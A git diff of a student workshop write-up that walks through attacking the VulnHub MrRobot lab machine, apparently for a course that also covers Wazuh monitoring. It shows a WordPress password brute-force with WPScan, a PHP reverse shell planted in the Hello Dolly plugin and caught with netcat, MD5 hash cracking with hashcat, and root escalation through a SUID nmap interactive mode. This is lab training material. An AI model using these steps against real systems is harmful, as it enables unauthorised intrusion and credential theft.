@@ -1,4 +1,52 @@
-192.168.1.93
+---
+title: "Workshop 4 - Brute Force"
+author: "Toni Peraira"
+date: "2022-03-25"
+version: "1.0"
+geometry: left=2.54cm,right=2.54cm,top=2.54cm,bottom=2.54cm
+header-right: '\headerlogo'
+header-includes:
+- '`\newcommand{\headerlogo}{\raisebox{0pt}[0pt]{\includegraphics[width=3cm]{../../institut_montilivi.png}}}`{=latex}'
+---
+
+<!--
+pandoc README.md -o Toni_Peraira_Workshop_04_Brute_Force.pdf --from markdown --template eisvogel --listings --pdf-engine=xelatex
+-->
+
+# Workshop 4 - Brute Force
+
+![](images/wallpaper.jpg)
+
+In this workshop you will do a brute force and reverse shell attack on the web of a Linux machine and you will get *root* permissions. The victim is an extreme machine from VulnHub (MrRobot) on he
+Install a Wazuh agent and send events and alerts to our Wazuh *manager*. After carry out the attack, it is a report of the alerts and/or events collected at Wazuh.
+
+---
+
+Machines:
+
+* Victim: 192.168.1.93
+
+* Wazuh manager: 192.168.1.80
+
+* Attacker: 192.168.1.224
+
+---
+
+Attack:
+
+Find out which ports are open:
+
+!["Scan open ports"](images/image02.png "Scan open ports")
+
+Since Port 80 is open, visit the web content to see what's there.
+
+We find a very cool website that emulates a terminal used in Mr. Robot.
+
+!["fsociety web"](images/image01.png "fsociety web")
+
+We can find folders and files used in popular web applications with *http-enum* script of *nmap*.
+
+!["Find popular folders and files"](images/image03.png "Find popular folders and files")
 
 ```
 $ nmap -sV --script=http-enum 192.168.1.93
@@ -49,6 +97,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 110.71 seconds
 ```
 
+From the files found we can deduce that it's a website based on WordPress, from all the files with the *wp* prefix.
+
+
+A very good tool to exploit WordPress vulnerabilites is ***WPScan***, which can be used as follows in order to get passwords:
+
+!["WPScan with admin user"](images/image04.png "WPScan with admin user")
+
 ```
 └──╼ $wpscan --url http://192.168.1.93 -U 'admin' -P /usr/share/wordlists/dirb/others/best1050.txt --password-attack wp-login
 _______________________________________________________________
@@ -68,6 +123,10 @@ _______________________________________________________________
 
 Scan Aborted: The url supplied 'http://192.168.1.93/' seems to be down (Timeout was reached)
 ```
+
+We have tried to exploit the password of the admin user with the wordlist used in the previous exercise, but it has not been possible.
+
+As we are all big fans of the Mr. Robot, we will try to do the same but with usernames that are related to the series. We use usernames that have to do with the protagonist, Elliot Alderson.
 
 ```
 $ wpscan --url http://192.168.1.83 -U 'elliot, ELLIOT, alderson, ALDERSON, robot' -P /usr/share/wordlists/dirb/others/best1050.txt --password-attack wp-login
@@ -169,10 +228,27 @@ Trying  robot / zzzzzz Time: 00:00:48 <=========================================
 [+] Elapsed time: 00:00:54
 ```
 
+Voilà! In the scan report we can find the password for the user *elliot*:
+
 >Username:  ELLIOT, Password: qosqomanta
 
+---
 
-Edit *Hello Dolly* plugin.
+As we all know, WordPress has countless vulnerabilities, most of them due to plugins. We will go to see if there are any plugins that we can exploit.
+
+!["Plugins installed in the web"](images/image05.png "Plugins installed in the web")
+
+We choose the *Hello Dolly* plugin.
+
+Here we will add to the code that will make a reverse shell, we can copy the code from the following:
+
+[https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
+
+We change the first lines with the attacker IP and the port where we will hearing with Netcat:
+
+!["Editing Hello Dolly plugin"](images/image06.png "Editing Hello Dolly plugin")
+
+We listen with Netcat:
 
 ```
 └──╼ $nc -lnvp 6666
@@ -187,6 +263,12 @@ uid=1(daemon) gid=1(daemon) groups=1(daemon)
 $ whoami
 daemon
 ```
+
+Now that we are listening we update the edited file with the exploit and we are in:
+
+!["Reverse shell"](images/image07.png "Reverse shell")
+
+Let's get some system information to see if we can escalate privileges.
 
 ```
 $ cat /etc/passwd
@@ -226,15 +308,21 @@ key-2-of-3.txt
 password.raw-md5
 ```
 
+It seems that we have found a MD5 hash of the password for the *robot* user, this seems very interesting and strange
+
 ```
 $ cat /home/robot/password.raw-md5
 robot:c3fcd3d76192e4007dfb496cca67e13b
 ```
 
+Let's try to crack this hash using ***hashcat***. First we save the hash in a file:
+
 ```
 └──╼ $cat /home/tonipm/hash 
 c3fcd3d76192e4007dfb496cca67e13b
 ```
+
+We use the file with the hash with the hashcat:
 
 ```
 └──╼ $hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
@@ -299,7 +387,13 @@ Started: Fri Mar 25 19:32:57 2022
 Stopped: Fri Mar 25 19:33:51 2022
 ```
 
+It has been easy to find the password behind the hash, just 1 minute:
+
 >c3fcd3d76192e4007dfb496cca67e13b:**abcdefghijklmnopqrstuvwxyz**
+
+If we try to change user, we will see that we do not have privileges but we can do it if we generate a console. Let's open a console with Python and paste the obtained password:
+
+!["robot password"](images/image08.png "robot password")
 
 ```
 $ su robot
@@ -311,6 +405,9 @@ Password: abcdefghijklmnopqrstuvwxyz
 
 robot@linux:~$ 
 ```
+
+Now we search for files with SUID permissions, those with the *s* bit enabled. This property is
+necessary for normal users to perform tasks that require more privileges:
 
 ```
 robot@linux:~$ find /* -user root -perm -4000 -print 2> /dev/null
@@ -335,11 +432,21 @@ find /* -user root -perm -4000 -print 2> /dev/null
 robot@linux:~$ 
 ```
 
+From this list we will choose */usr/local/bin/nmap*, we can see the *s* in *-rw**s**r-xr-x*:
+
 ```
 robot@linux:~$ ls -ls /usr/local/bin/nmap
 ls -ls /usr/local/bin/nmap
 496 -rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
 ```
+
+This nmap is an older version, nmap 3.81 when the current version is 7.92, that allows *interactive mode*, we can check it out running it without any parameters.
+
+The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
+
+As nmap has been run with *sudo* privileges we can run a shell with privileges.
+
+!["Shell with root permissions"](images/image09.png "Shell with root permissions")
 
 ```
 robot@linux:~$ /usr/local/bin/nmap --interactive
@@ -349,10 +456,9 @@ Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
 Welcome to Interactive Mode -- press h <enter> for help
 nmap> !sh
 !sh
-# whoiam
-whoiam
-sh: 1: whoiam: not found
 # whoami
 whoami
 root
 ```
+
+Finally we have a shell with privileges! Now we can do all the bad things we want.
